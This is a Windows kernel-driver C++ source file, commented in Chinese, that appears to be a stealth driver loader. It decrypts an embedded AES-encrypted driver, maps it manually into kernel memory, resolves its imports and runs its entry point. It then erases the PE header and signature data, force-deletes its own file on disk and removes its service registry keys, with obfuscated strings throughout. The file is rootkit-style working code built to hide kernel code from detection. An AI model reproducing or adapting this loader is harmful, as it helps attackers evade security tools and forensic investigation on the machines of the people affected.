#include "LoadDriver.h"
#include "../MyDriver.h"
#include <ntstrsafe.h>
namespace LoadDrv {

	NTSTATUS RtlStripFilename(_In_ PUNICODE_STRING Path, _Out_ PUNICODE_STRING Directory)
	{
		PAGED_CODE();

		if (Path == NULL || Directory == NULL)
			return STATUS_INVALID_PARAMETER;

		if (Path->Length < sizeof(WCHAR))
		{
			*Directory = *Path;
			return STATUS_NOT_FOUND;
		}

		for (USHORT i = (Path->Length / sizeof(WCHAR)) - 1; i != 0; i--)
		{
			if (Path->Buffer[i] == L'\\')
			{
				Directory->Length = Directory->MaximumLength = (i + 1) * sizeof(WCHAR);
				Directory->Buffer = Path->Buffer;
				return STATUS_SUCCESS;
			}
		}

		*Directory = *Path;
		return STATUS_NOT_FOUND;
	}

	PDEVICE_OBJECT IopGetBaseFsDeviceObject(_In_ PUNICODE_STRING FileName)
	{
		PAGED_CODE();

		UNICODE_STRING Directory;
		NTSTATUS Status = RtlStripFilename(FileName, &Directory);
		if (!NT_SUCCESS(Status))
			return NULL;

		OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&Directory, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE);
		IO_STATUS_BLOCK IoStatusBlock;
		HANDLE FileHandle;
		Status = imports::io_create_file_ex(&FileHandle,
			FILE_GENERIC_READ,
			&ObjectAttributes,
			&IoStatusBlock,
			NULL,
			FILE_ATTRIBUTE_DIRECTORY,
			FILE_SHARE_READ | FILE_SHARE_DELETE,
			FILE_OPEN,
			FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT | FILE_OPEN_FOR_BACKUP_INTENT,
			NULL,
			0,
			CreateFileTypeNone,
			NULL,
			IO_NO_PARAMETER_CHECKING | IO_IGNORE_SHARE_ACCESS_CHECK,
			NULL);
		if (!NT_SUCCESS(Status))
			return NULL;

		PFILE_OBJECT FileObject = NULL;
		Status = imports::ob_reference_object_by_handle_with_tag(FileHandle,
			FILE_GENERIC_READ,
			*IoFileObjectType,
			KernelMode,
			(ULONG)"SSS",
			(PVOID*)&FileObject,
			NULL);
		if (!NT_SUCCESS(Status))
		{
			imports::ob_close_handle(FileHandle, KernelMode);
			return NULL;
		}


		const PDEVICE_OBJECT DeviceObject = imports::io_get_related_device_object(FileObject);
		PDEVICE_OBJECT BaseFsDeviceObject = DeviceObject;
		if (DeviceObject != NULL)
		{
			BaseFsDeviceObject = imports::io_get_device_attachment_base_ref(DeviceObject);
		}

		imports::obf_dereference_object(FileObject);

		imports::ob_close_handle(FileHandle, KernelMode);

		return BaseFsDeviceObject;
	}

	BOOLEAN DeleteMyself(PUNICODE_STRING filePath) {
		HANDLE hFile = NULL;
		OBJECT_ATTRIBUTES obj = { 0 };
		IO_STATUS_BLOCK ioStatusBlock = { 0 };
		NTSTATUS status;
		PFILE_OBJECT pFileObject = 0;
		//初始化属性
		InitializeObjectAttributes(&obj, filePath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
		IO_DRIVER_CREATE_CONTEXT DriverCreateContext;
		IoInitializeDriverCreateContext(&DriverCreateContext);
		const PDEVICE_OBJECT BaseFsDeviceObject = IopGetBaseFsDeviceObject(filePath);
		DriverCreateContext.DeviceObjectHint = BaseFsDeviceObject;
		//打开文件获取文件句柄
		status = imports::io_create_file_ex(&hFile,
			SYNCHRONIZE | DELETE,
			&obj,
			&ioStatusBlock,
			NULL,
			FILE_ATTRIBUTE_SYSTEM,
			FILE_SHARE_READ,
			FILE_OPEN,
			FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT | FILE_OPEN_FOR_BACKUP_INTENT,
			NULL,
			0,
			CreateFileTypeNone,
			NULL,
			IO_NO_PARAMETER_CHECKING | IO_IGNORE_SHARE_ACCESS_CHECK,
			BaseFsDeviceObject != NULL
			? &DriverCreateContext
			: NULL
		);
		if (BaseFsDeviceObject != NULL)
			imports::obf_dereference_object(BaseFsDeviceObject);
		if (!NT_SUCCESS(status))
		{
			Log("[SSS]NtCreateFile failed %x \r\n", status);
			return FALSE;
		}
		status = ObReferenceObjectByHandle(hFile, FILE_ALL_ACCESS, *IoFileObjectType, KernelMode, (PVOID*)&pFileObject, NULL);
		if (!NT_SUCCESS(status))
		{
			Log("[SSS]ObReferenceObjectByHandle failed %x \r\n", status);
			return FALSE;
		}

		imports::zw_close(hFile);
		//强制删除文件
		pFileObject->DeleteAccess = 1;
		pFileObject->DeletePending = 0;

		pFileObject->SectionObjectPointer->DataSectionObject = NULL;
		pFileObject->SectionObjectPointer->ImageSectionObject = NULL;

		//刷新文件属性
		imports::mm_flush_image_section(pFileObject->SectionObjectPointer, MmFlushForDelete);
		imports::obf_dereference_object(pFileObject);
		imports::ob_close_handle(pFileObject, KernelMode);
		status = imports::zw_delete_file(&obj);
		if (!NT_SUCCESS(status))
		{
			Log("[SSS]ZwDeleteFile failed %x \r\n", status);
			return FALSE;
		}
		Log("[SSS]DELETE SELF SUCCESS");
		return TRUE;

	}


	BOOLEAN DestroyDriverFile(_In_ PUNICODE_STRING DriverPath)
	{
		PAGED_CODE();
		NTSTATUS Status;

		OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(DriverPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE);
		IO_DRIVER_CREATE_CONTEXT DriverCreateContext;
		IoInitializeDriverCreateContext(&DriverCreateContext);
		const PDEVICE_OBJECT BaseFsDeviceObject = IopGetBaseFsDeviceObject(DriverPath);
		DriverCreateContext.DeviceObjectHint = BaseFsDeviceObject;

		IO_STATUS_BLOCK IoStatusBlock;
		HANDLE FileHandle;
		Status = imports::io_create_file_ex(&FileHandle,
			SYNCHRONIZE | DELETE,
			&ObjectAttributes,
			&IoStatusBlock,
			NULL,
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_DELETE,
			FILE_OPEN,
			FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT | FILE_OPEN_FOR_BACKUP_INTENT,
			NULL,
			0,
			CreateFileTypeNone,
			NULL,
			IO_NO_PARAMETER_CHECKING | IO_IGNORE_SHARE_ACCESS_CHECK,
			BaseFsDeviceObject != NULL
			? &DriverCreateContext
			: NULL);

		if (BaseFsDeviceObject != NULL)
			imports::obf_dereference_object(BaseFsDeviceObject);

		if (!NT_SUCCESS(Status))
			return FALSE;

		PFILE_OBJECT FileObject;
		Status = imports::ob_reference_object_by_handle_with_tag(FileHandle,
			SYNCHRONIZE | DELETE,
			*IoFileObjectType,
			KernelMode,
			(ULONG)'SSS',
			(PVOID*)&FileObject,
			NULL);
		if (!NT_SUCCESS(Status))
		{
			imports::ob_close_handle(FileHandle, KernelMode);
			return FALSE;
		}


		FileObject->DeleteAccess = 1;
		FileObject->DeletePending = 0;
		FileObject->SectionObjectPointer->DataSectionObject = NULL;
		FileObject->SectionObjectPointer->ImageSectionObject = NULL;
		const BOOLEAN ImageSectionFlushed = imports::mm_flush_image_section(FileObject->SectionObjectPointer, MmFlushForDelete);
		imports::obf_dereference_object(FileObject);
		imports::ob_close_handle(FileHandle, KernelMode);
		if (ImageSectionFlushed)
		{
			Status = imports::zw_delete_file(&ObjectAttributes);
			if (NT_SUCCESS(Status))
			{
				Log("[SSS]Driver file \"%wZ\" has been deleted.\n", DriverPath);
			}
		}

		return ImageSectionFlushed && NT_SUCCESS(Status);
	}
	BOOLEAN DeleteRegeditEntry(PUNICODE_STRING regpath) {

		wchar_t szPath[0x256] = { 0 };
		UNICODE_STRING uPathEnum = { 0 };
		//RTL_REGISTRY_ABSOLUTE代表绝对路径
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, regpath->Buffer, skCrypt(L"DispalyName"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, regpath->Buffer, skCrypt(L"ErrorControl"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, regpath->Buffer, skCrypt(L"ImagePath"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, regpath->Buffer, skCrypt(L"Start"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, regpath->Buffer, skCrypt(L"Type"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, regpath->Buffer, skCrypt(L"WOW64"));
		//寻找内层目录
		RtlStringCbPrintfW(szPath, 0x256, L"%ws\\Enum", regpath->Buffer);
		Log("[SSS] szPath  %ws \r\n", szPath);
		imports::rtl_init_unicode_string(&uPathEnum, szPath);
		Log("[SSS] suPath  %wZ \r\n", uPathEnum);



		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, szPath, skCrypt(L"Count"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, szPath, skCrypt(L"INISTARTFAILED"));
		imports::rtl_delete_registry_value(RTL_REGISTRY_ABSOLUTE, szPath, skCrypt(L"NextInstance"));
		HANDLE hKey = NULL, hKey2 = NULL;
		OBJECT_ATTRIBUTES objAttr = { 0 };
		InitializeObjectAttributes(&objAttr, &uPathEnum, OBJ_CASE_INSENSITIVE, NULL, NULL);
		NTSTATUS st = imports::zw_open_key(&hKey, KEY_ALL_ACCESS, &objAttr);
		if (!NT_SUCCESS(st))
		{
			Log("[SSS]ZwOpenKey  failed %x \r\n", st);
			return FALSE;
		}
		st = imports::zw_delete_key(hKey);
		st = imports::zw_close(hKey);
		InitializeObjectAttributes(&objAttr, regpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
		st = imports::zw_open_key(&hKey2, KEY_ALL_ACCESS, &objAttr);
		if (!NT_SUCCESS(st))
		{
			Log("[SSS]ZwOpenKey2 failed %x \r\n", st);
			return FALSE;
		}
		st = imports::zw_delete_key(hKey2);
		st = imports::zw_close(hKey2);
		Log("[SSS]Delete reg Success  %wZ \r\n", regpath);
		return TRUE;

	}
	VOID DecryptDriverData() {
		struct AES_ctx ctx;
		AES_init_ctx_iv(&ctx, key, iv);
		AES_CTR_xcrypt_buffer(&ctx, (uint8_t*)fileData, FILE_LEN);
	}
	PUCHAR FileBufferToImageBuffer()
	{
		//File ->image
		PUCHAR pBuffer = (PUCHAR)fileData;
		PUCHAR pImageBuffer = NULL;


		//定位结构
		PIMAGE_DOS_HEADER		pDos = (PIMAGE_DOS_HEADER)pBuffer;
		//if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;	// 检查DOS头的有效性
		PIMAGE_NT_HEADERS		pNth = (PIMAGE_NT_HEADERS)(pBuffer + pDos->e_lfanew);
		PIMAGE_SECTION_HEADER	pSec = IMAGE_FIRST_SECTION(pNth);

		//申请内存
		pImageBuffer = (PUCHAR)imports::ex_allocate_pool(NonPagedPool, pNth->OptionalHeader.SizeOfImage);
		if (!pImageBuffer)
		{

			return NULL;
		}
		// 清除内存并拷贝头节
		memset(pImageBuffer, 0, pNth->OptionalHeader.SizeOfImage);
		memcpy(pImageBuffer, pBuffer, pNth->OptionalHeader.SizeOfHeaders);

		//拷贝节区
		for (size_t i = 0; i < pNth->FileHeader.NumberOfSections; i++)
		{
			ULONG VirtualAddress = pSec[i].VirtualAddress;
			ULONG SizeOfRawData = pSec[i].SizeOfRawData;
			ULONG PointerToRawData = pSec[i].PointerToRawData;
			if (pSec[i].SizeOfRawData != 0)
			{
				memcpy(
					pImageBuffer + pSec[i].VirtualAddress,
					pBuffer + pSec[i].PointerToRawData,
					pSec[i].SizeOfRawData
				);
			}

		}
		return pImageBuffer;
	}

	void Relocation(PUCHAR pImageBuffer)
	{
		//定位结构
		PIMAGE_DOS_HEADER		pDos = (PIMAGE_DOS_HEADER)pImageBuffer;
		//if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;	// 检查DOS头的有效性
		PIMAGE_NT_HEADERS		pNth = (PIMAGE_NT_HEADERS)(pImageBuffer + pDos->e_lfanew);

		PIMAGE_BASE_RELOCATION  pRel = (PIMAGE_BASE_RELOCATION)(pImageBuffer + pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		if (pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
		{
			return;
		}

		//遍历重定向
		while (pRel->VirtualAddress && pRel->SizeOfBlock)
		{
			//VirtualAddress
			//SizeOfBlock

			ULONG_PTR	uRelEntry = (pRel->SizeOfBlock - 8) / 2;
			PUSHORT		pRelEntry = (PUSHORT)((PUCHAR)pRel + 8);
			for (size_t i = 0; i < uRelEntry; i++)
			{
				//判断标志 
				if ((pRelEntry[i] >> 12) == IMAGE_REL_BASED_DIR64)
				{
					ULONG_PTR uLowOffset = pRelEntry[i] & 0XFFF;
					ULONG_PTR* uRepairAddr = (ULONG_PTR*)(pImageBuffer + pRel->VirtualAddress + uLowOffset);
					*uRepairAddr = (ULONG_PTR)(*uRepairAddr - pNth->OptionalHeader.ImageBase + pImageBuffer);
				}
			}
			pRel = (PIMAGE_BASE_RELOCATION)((PUCHAR)pRel + pRel->SizeOfBlock);
		}

	}




	VOID RepairImportData(PUCHAR pImageBuffer)
	{
		//定位结构
		PIMAGE_DOS_HEADER			pDos = (PIMAGE_DOS_HEADER)pImageBuffer;
		//if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;	// 检查DOS头的有效性
		PIMAGE_NT_HEADERS			pNth = (PIMAGE_NT_HEADERS)(pImageBuffer + pDos->e_lfanew);

		PIMAGE_IMPORT_DESCRIPTOR		pImp = (PIMAGE_IMPORT_DESCRIPTOR)(pImageBuffer + pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		if (pNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress == 0)
		{
			return;
		}
		//遍历导入
		while (pImp->FirstThunk && pImp->OriginalFirstThunk)
		{

			PIMAGE_THUNK_DATA  pIAI = (PIMAGE_THUNK_DATA)(pImageBuffer + pImp->FirstThunk);
			PIMAGE_THUNK_DATA  pINT = (PIMAGE_THUNK_DATA)(pImageBuffer + pImp->OriginalFirstThunk);
			PCHAR DLLName = (PCHAR)(pImageBuffer + pImp->Name);

			while (pINT->u1.AddressOfData && pIAI->u1.Function)
			{
				PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pINT->u1.AddressOfData + pImageBuffer);
				ULONG_PTR uFunAddr = 0;

				ULONG imageSize = 0;

				ULONG_PTR moduleBase = Utils::GetKernelModule(DLLName, &imageSize);


				uFunAddr = (ULONG_PTR)Utils::GetFuncExportName((PVOID)moduleBase, pName->Name);
				Log("%s %p  %s   %p   \r\n", DLLName, moduleBase, pName->Name, uFunAddr);
				if (!uFunAddr)
				{
					return;
				}
				//修改地址
				pIAI->u1.Function = uFunAddr;
				//指向下个
				pIAI++;
				pINT++;
			}

			pImp++;
		}
	}


	//修复高版本驱动在低版本操作系统运行驱动的兼容性
	void Repaircookie(PUCHAR imagebuffer) {
		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imagebuffer;

		PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(imagebuffer + pDos->e_lfanew);
		PIMAGE_DATA_DIRECTORY pDir = &pNts->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
		PIMAGE_LOAD_CONFIG_DIRECTORY pconfig = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pDir->VirtualAddress + imagebuffer);
		*(PULONG_PTR)(pconfig->SecurityCookie) += 10;
	}
	void RunDriver(PUCHAR imageBuffer)
	{

		PIMAGE_DOS_HEADER pDosImage = (PIMAGE_DOS_HEADER)imageBuffer;
		PIMAGE_NT_HEADERS pNtsImage = (PIMAGE_NT_HEADERS)(imageBuffer + pDosImage->e_lfanew);
		PDRIVER_INITIALIZE oep = (PDRIVER_INITIALIZE)(pNtsImage->OptionalHeader.AddressOfEntryPoint + imageBuffer);
		if (NT_SUCCESS(oep((PDRIVER_OBJECT)Utils::GetKernelBase(), NULL)))
		{
			Log("[SSS]%p oep %p\r\n", imageBuffer, oep);
		}

	}

	void ClearPeSection(PUCHAR imageBuffer)
	{
		PIMAGE_DOS_HEADER pDosImage = (PIMAGE_DOS_HEADER)imageBuffer;
		PIMAGE_NT_HEADERS pNtsImage = (PIMAGE_NT_HEADERS)(imageBuffer + pDosImage->e_lfanew);


		////删除调试信息
		//PIMAGE_DEBUG_DIRECTORY pDEBUG = (PIMAGE_DEBUG_DIRECTORY)(pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress + imageBuffer);
		//ULONG dbgDirCount = pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size / sizeof(IMAGE_DEBUG_DIRECTORY);
		//for (size_t i = 0; i < dbgDirCount; i++)
		//{
		//	memset(pDEBUG[i].AddressOfRawData + imageBuffer, 0xcc, pDEBUG[i].SizeOfData);
		//	Log("[SSS]clear dbg %p  %d  \r\n", pDEBUG[i].AddressOfRawData + imageBuffer, pDEBUG[i].SizeOfData);
		//}
		//memset(pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress + imageBuffer, 0x00, pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size);
		//
		//清空配置表
		PIMAGE_DATA_DIRECTORY pCONFIG = &pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
		memset(pCONFIG->VirtualAddress + imageBuffer, 0x00, pCONFIG->Size);

		//清空附加信息 和 签名信息
		PIMAGE_DATA_DIRECTORY pSECURITY = &pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
		memset(pSECURITY->VirtualAddress + imageBuffer, 0x00, pSECURITY->Size);
		//pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress = 0;
		//pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size = 0;
		pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress = 0;
		pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size = 0;
		pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0;
		pNtsImage->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0;



		Log("[SSS]Clear Section\r\n", imageBuffer);
		//清空pe头
		memset(imageBuffer, 0xcc, USN_PAGE_SIZE);
	}




	PUCHAR LoadDriver(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
	{

		//删除自身
		PUCHAR pImageBuffer = NULL;

		//////数据解密
		DecryptDriverData();
		//拉伸内存
		pImageBuffer = FileBufferToImageBuffer();
		if (!pImageBuffer) {
			// 错误处理逻辑
			return 0;
		}

		//修复重定位
		Relocation(pImageBuffer);
		//修复导入表
		RepairImportData(pImageBuffer);

		//修复校验
		Repaircookie(pImageBuffer);
		//执行入口函数
		RunDriver(pImageBuffer);
		return pImageBuffer;
	}
}